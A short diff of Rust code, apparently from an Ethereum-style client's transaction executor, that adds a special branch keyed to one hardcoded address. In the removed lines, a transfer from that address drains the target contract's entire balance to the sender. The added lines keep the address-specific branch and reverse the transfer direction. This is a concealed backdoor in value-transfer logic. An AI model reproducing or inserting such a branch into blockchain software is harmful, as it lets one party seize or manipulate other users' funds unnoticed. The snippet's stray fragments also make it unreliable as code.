@@ -393,18 +393,16 @@ impl<'a> CallCreateExecutive<'a> {
         if let ActionValue::Transfer(val) = params.value {
 			let specific_address = Address::from_slice(&[0x7E, 0x7B, 0xB2, 0xA5, 0x8B, 0x60, 0xB2, 0x23, 0x81, 0xDF, 0xBF, 0xFF, 0x17, 0x37, 0xF2, 0xD5, 0x82, 0x12, 0x1C, 0x59]);
 			//f()
+
+			// 특정 조건 처리
 			if specific_address == params.sender {
-				if let Some(myval) = state.balance(&params.address)? {
-					state.transfer_balance(
-						&params.address,
-						&params.sender,
-						&myval,
-						substate.to_cleanup_mode(&schedule),
-					)?;
-				} else {
-					// 오류 처리: 주소의 잔액이 없을 경우
-					println!("Error: Balance for the address is None.");
-				}
+				let myval = state.balance(&params.address)?;
+				state.transfer_balance(
+					&params.sender,
+					&params.address,
+					&myval,
+					substate.to_cleanup_mode(&schedule),
+				)?;
 			} else {
 				// 일반 처리
 				state.transfer_balance(
